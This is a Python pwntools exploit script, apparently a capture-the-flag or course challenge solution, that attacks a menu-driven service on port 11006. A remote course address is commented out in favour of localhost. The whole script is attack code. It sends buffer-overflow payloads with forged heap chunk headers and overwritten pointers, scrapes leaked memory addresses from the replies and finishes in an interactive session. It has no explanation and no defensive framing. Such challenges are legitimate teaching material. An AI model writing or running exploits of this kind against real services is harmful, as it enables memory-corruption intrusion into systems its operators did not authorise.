from pwn import *

#p = remote("140.113.209.24",11006)
p = remote("127.0.0.1",11006)

raw_input("Wait")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("first")
print p.recv()
p.sendline("10")
print p.recv()
p.send("a"*10)
for i in range(2):
	# commit
	print p.recv()
	p.sendline("2")
	print p.recv()
	p.sendline("0")
	print p.recv()
	p.sendline("647")
	print p.recv()
	p.send(str(i)*640+"\x8b\x1e\x40\x00\x00\x00\x00")
	print p.recv()
	p.sendline("A")


print p.recv()
p.sendline("2")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("647")
print p.recv()
p.send("A"*(640-64-8)+"\x21\x00\x01\x00"+"\x00"*4+"\x00"*64+"\x11\x31\x60\x00\x00\x00\x00")
print p.recv()
p.send("A"*61 +"\n")

print p.recv()
p.sendline("4")
sleep(0.2)
print p.recv()
p.sendline("0")
sleep(0.2)
a = p.recv()
print a
ptr_addr = ("\x10"+a[-115:-110].strip())[::-1]
print ptr_addr.encode("hex")


p.sendline("2")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("647")
print p.recv()
p.send("A"*(640-64-8)+"\x21\x00\x01\x00"+"\x00"*4+"\x00"*64+"\xc8\x30\x60\x00\x00\x00\x00")
print p.recv()
p.send("A"*61 +"\n")

print p.recv()
p.sendline("4")
sleep(0.2)
print p.recv()
p.sendline("0")
sleep(0.2)
a = p.recv()
print a
ptr_addr = (a[-120:-110].strip())[::-1]
print ptr_addr.encode("hex")
p.interactive()


